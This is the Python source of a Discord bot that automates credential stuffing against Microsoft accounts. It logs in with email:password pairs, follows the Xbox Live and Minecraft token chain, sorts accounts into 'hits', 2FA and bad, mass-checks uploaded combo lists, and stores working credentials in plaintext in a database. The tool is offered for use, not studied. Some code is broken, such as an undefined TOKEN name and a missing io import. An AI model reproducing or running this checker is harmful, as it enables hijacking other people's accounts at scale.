import discord
from discord.ext import commands
import requests
import re
import os
import time
import threading
import random
import urllib3
import json
import os
import concurrent.futures
import asyncio
import sqlite3
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# Minecraft networking imports (for ban checking)
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound

urllib3.disable_warnings()

# ==================== CONFIGURATION ====================
TOKEN = os.getenv(TOKEN) # Replace with your bot token
PREFIX = "c!"

# Server addresses for ban checking
HYPIXEL_ALPHA = "alpha.hypixel.net"
HYPIXEL_PORT = 25565
DONUT_SMP = "donutsmp.net"
DONUT_PORT = 25565

# Database setup
conn = sqlite3.connect('msmc_bot.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS checks
             (user_id INTEGER, email TEXT, password TEXT, ign TEXT, 
              status TEXT, timestamp TEXT, result TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS proxies
             (proxy TEXT, type TEXT, last_used TEXT, success_count INTEGER)''')
conn.commit()

# ==================== AUTHENTICATION FUNCTIONS ====================
sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

def get_urlPost_sFTTag(session):
    while True:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sFTTag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sFTTag, session
        except Exception:
            pass
        time.sleep(1)

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    tries = 0
    while tries < 3:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                         allow_redirects=True, timeout=15)
            if '#' in login_request.url and login_request.url != sFTTag_url:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                return "2FA", session
            elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist."]):
                return "BAD", session
            else:
                tries += 1
        except:
            tries += 1
    return "BAD", session

def get_xsts_token(session, rps_token, relying_party="http://xboxlive.com"):
    try:
        xbl_login = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                  json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                                      "RpsTicket": rps_token},
                                        "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"},
                                  headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                  timeout=15)
        xbl_json = xbl_login.json()
        xbl_token = xbl_json.get('Token')
        if not xbl_token:
            return None, None
        uhs = xbl_json['DisplayClaims']['xui'][0]['uhs']
        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                            json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                                  "RelyingParty": relying_party, "TokenType": "JWT"},
                            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                            timeout=15)
        xsts_json = xsts.json()
        xsts_token = xsts_json.get('Token')
        if xsts_token:
            return uhs, xsts_token
        return None, None
    except:
        return None, None

def get_minecraft_token(session, uhs, xsts_token):
    try:
        mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                headers={'Content-Type': 'application/json'}, timeout=15)
        if mc_login.status_code == 200:
            return mc_login.json().get('access_token')
        return None
    except:
        return None

def get_minecraft_profile(session, mc_token):
    headers = {'Authorization': f'Bearer {mc_token}'}
    try:
        resp = session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            ign = data.get('name', 'N/A')
            capes = ", ".join([cape["alias"] for cape in data.get("capes", [])])
            uuid = data.get('id', 'N/A')
            return ign, capes, uuid
        return None, None, None
    except:
        return None, None, None

def check_account(email, password):
    """Main function to check a single account"""
    session = requests.Session()
    session.verify = False
    
    try:
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        rps_token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if rps_token == "BAD":
            return {"status": "bad", "message": "Invalid credentials"}
        elif rps_token == "2FA":
            return {"status": "2fa", "message": "2FA required"}
        
        uhs, xsts_token = get_xsts_token(session, rps_token, "rp://api.minecraftservices.com/")
        if not uhs or not xsts_token:
            return {"status": "error", "message": "XSTS token failed"}
        
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            return {"status": "valid_mail", "message": "Valid Microsoft account, no Minecraft"}
        
        ign, capes, uuid = get_minecraft_profile(session, mc_token)
        if ign:
            return {
                "status": "hit",
                "ign": ign,
                "capes": capes,
                "uuid": uuid,
                "message": f"✅ **HIT!**\nIGN: {ign}\nCapes: {capes if capes else 'None'}"
            }
        else:
            return {"status": "error", "message": "Profile fetch failed"}
            
    except Exception as e:
        return {"status": "error", "message": str(e)}
    finally:
        session.close()

def check_account_with_ban(email, password):
    """Check account with ban status (slower, uses proxies)"""
    result = check_account(email, password)
    
    if result["status"] == "hit":
        # Get ban status from Hypixel Alpha
        try:
            auth_token = AuthenticationToken(username=result["ign"], access_token=None, client_token=None)
            connection = Connection(HYPIXEL_ALPHA, HYPIXEL_PORT, auth_token=auth_token, initial_version=47)
            
            ban_info = None
            @connection.listener(clientbound.login.DisconnectPacket, early=True)
            def login_disconnect(packet):
                nonlocal ban_info
                data = json.loads(str(packet.json_data))
                ban_info = "BANNED: " + data.get('text', 'Unknown')
            
            connection.connect()
            time.sleep(2)
            connection.disconnect()
            
            if ban_info:
                result["message"] += f"\nHypixel: {ban_info}"
            else:
                result["message"] += "\nHypixel: Not banned"
        except:
            result["message"] += "\nHypixel: Could not check"
            
    return result

# ==================== DISCORD BOT ====================
bot = commands.Bot(command_prefix=PREFIX, intents=discord.Intents.all())

# Store active checks per user
active_checks = {}

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    await bot.change_presence(activity=discord.Game(name=f"{PREFIX}help | Checking accounts"))

@bot.command(name="check", aliases=["c"], help="Check a single account: !check email:password")
async def check_single(ctx, credentials: str = None):
    """Check a single Microsoft account"""
    if not credentials:
        await ctx.send("❌ Please provide credentials in format: `!check email:password`")
        return
    
    if ":" not in credentials:
        await ctx.send("❌ Invalid format. Use: `email:password`")
        return
    
    email, password = credentials.split(":", 1)
    
    # Send initial message
    msg = await ctx.send(f"🔍 Checking `{email}`...")
    
    # Run check in thread to avoid blocking
    def check_thread():
        return check_account(email, password)
    
    result = await asyncio.get_event_loop().run_in_executor(None, check_thread)
    
    # Create embed
    embed = discord.Embed(title="Account Check Result", color=discord.Color.blue())
    embed.add_field(name="Email", value=email, inline=False)
    
    if result["status"] == "hit":
        embed.color = discord.Color.green()
        embed.add_field(name="Status", value="✅ HIT", inline=True)
        embed.add_field(name="IGN", value=result["ign"], inline=True)
        embed.add_field(name="Capes", value=result["capes"] if result["capes"] else "None", inline=False)
        embed.add_field(name="UUID", value=result["uuid"], inline=False)
        
        # Save to database
        c.execute("INSERT INTO checks VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (ctx.author.id, email, password, result["ign"], "hit", 
                   datetime.now().isoformat(), json.dumps(result)))
        conn.commit()
        
    elif result["status"] == "valid_mail":
        embed.color = discord.Color.gold()
        embed.add_field(name="Status", value="📧 Valid Microsoft Account (No Minecraft)", inline=True)
        
        c.execute("INSERT INTO checks VALUES (?, ?, ?, ?, ?, ?, ?)",
                  (ctx.author.id, email, password, "N/A", "valid_mail",
                   datetime.now().isoformat(), json.dumps(result)))
        conn.commit()
        
    elif result["status"] == "2fa":
        embed.color = discord.Color.orange()
        embed.add_field(name="Status", value="🔐 2FA Required", inline=True)
        
    elif result["status"] == "bad":
        embed.color = discord.Color.red()
        embed.add_field(name="Status", value="❌ BAD", inline=True)
        
    else:
        embed.color = discord.Color.red()
        embed.add_field(name="Status", value="⚠️ Error", inline=True)
        embed.add_field(name="Error", value=result["message"], inline=False)
    
    await msg.edit(content=None, embed=embed)

@bot.command(name="masscheck", aliases=["mc"], help="Mass check accounts from a file")
async def mass_check(ctx):
    """Mass check accounts from an uploaded file"""
    if not ctx.message.attachments:
        await ctx.send("❌ Please upload a file with credentials (one per line: email:password)")
        return
    
    attachment = ctx.message.attachments[0]
    
    if not attachment.filename.endswith('.txt'):
        await ctx.send("❌ Please upload a .txt file")
        return
    
    # Download file
    file_content = await attachment.read()
    lines = file_content.decode('utf-8').splitlines()
    
    # Filter valid lines
    combos = []
    for line in lines:
        line = line.strip()
        if line and ':' in line:
            combos.append(line)
    
    if not combos:
        await ctx.send("❌ No valid credentials found in file")
        return
    
    # Start checking
    msg = await ctx.send(f"🔍 Starting mass check of {len(combos)} accounts...")
    
    results = {"hits": [], "valid_mail": [], "bad": [], "2fa": [], "errors": []}
    
    for i, combo in enumerate(combos, 1):
        email, password = combo.split(":", 1)
        
        def check_thread():
            return check_account(email, password)
        
        result = await asyncio.get_event_loop().run_in_executor(None, check_thread)
        
        if result["status"] == "hit":
            results["hits"].append(f"{combo} | IGN: {result['ign']}")
        elif result["status"] == "valid_mail":
            results["valid_mail"].append(combo)
        elif result["status"] == "2fa":
            results["2fa"].append(combo)
        elif result["status"] == "bad":
            results["bad"].append(combo)
        else:
            results["errors"].append(combo)
        
        # Update progress every 10 accounts
        if i % 10 == 0 or i == len(combos):
            await msg.edit(content=f"🔍 Checking... {i}/{len(combos)} | Hits: {len(results['hits'])}")
    
    # Create result embed
    embed = discord.Embed(title="Mass Check Results", color=discord.Color.blue())
    embed.add_field(name="Total", value=len(combos), inline=True)
    embed.add_field(name="Hits", value=len(results["hits"]), inline=True)
    embed.add_field(name="Valid Mail", value=len(results["valid_mail"]), inline=True)
    embed.add_field(name="2FA", value=len(results["2fa"]), inline=True)
    embed.add_field(name="Bad", value=len(results["bad"]), inline=True)
    embed.add_field(name="Errors", value=len(results["errors"]), inline=True)
    
    # Save results to file
    output = []
    if results["hits"]:
        output.append("=== HITS ===\n" + "\n".join(results["hits"]))
    if results["valid_mail"]:
        output.append("\n=== VALID MAIL ===\n" + "\n".join(results["valid_mail"]))
    if results["2fa"]:
        output.append("\n=== 2FA ===\n" + "\n".join(results["2fa"]))
    
    if output:
        file_content = "\n".join(output)
        file = discord.File(io.StringIO(file_content), filename="results.txt")
        await ctx.send(embed=embed, file=file)
    else:
        await ctx.send(embed=embed)

@bot.command(name="stats", help="Show your check statistics")
async def stats(ctx):
    """Show user's check statistics"""
    c.execute("SELECT status, COUNT(*) FROM checks WHERE user_id = ? GROUP BY status", (ctx.author.id,))
    results = c.fetchall()
    
    if not results:
        await ctx.send("📊 You haven't checked any accounts yet!")
        return
    
    embed = discord.Embed(title=f"Statistics for {ctx.author.name}", color=discord.Color.blue())
    
    status_colors = {
        "hit": "✅ Hits",
        "valid_mail": "📧 Valid Mail",
        "bad": "❌ Bad",
        "2fa": "🔐 2FA"
    }
    
    total = 0
    for status, count in results:
        embed.add_field(name=status_colors.get(status, status), value=str(count), inline=True)
        total += count
    
    embed.add_field(name="Total", value=str(total), inline=True)
    embed.set_footer(text="Use !check to check more accounts!")
    
    await ctx.send(embed=embed)

@bot.command(name="help", aliases=["h"], help="Show this help message")
async def help_command(ctx):
    """Show help menu"""
    embed = discord.Embed(title="MSMC Discord Bot Commands", color=discord.Color.green())
    embed.add_field(name=f"{PREFIX}check email:password", value="Check a single account", inline=False)
    embed.add_field(name=f"{PREFIX}masscheck", value="Check multiple accounts (upload .txt file)", inline=False)
    embed.add_field(name=f"{PREFIX}stats", value="Show your check statistics", inline=False)
    embed.add_field(name=f"{PREFIX}help", value="Show this help message", inline=False)
    
    embed.set_footer(text="Made with ❤️ for Minecraft account checking")
    await ctx.send(embed=embed)

@bot.command(name="test", help="Test if bot is working")
async def test(ctx):
    """Simple test command"""
    await ctx.send("✅ Bot is working!")

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"❌ Command not found. Use `{PREFIX}help` for available commands.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument. Use `{PREFIX}help` for usage.")
    else:
        await ctx.send(f"❌ An error occurred: {str(error)}")
        print(error)

# ==================== RUN BOT ====================
if __name__ == "__main__":
    # Check for token
    if TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("⚠️ Please add your bot token to the script!")
        print("1. Go to https://discord.com/developers/applications")
        print("2. Create a new application")
        print("3. Go to Bot section and create a bot")
        print("4. Copy the token and paste it in the script")
        exit(1)
    
    bot.run(TOKEN)
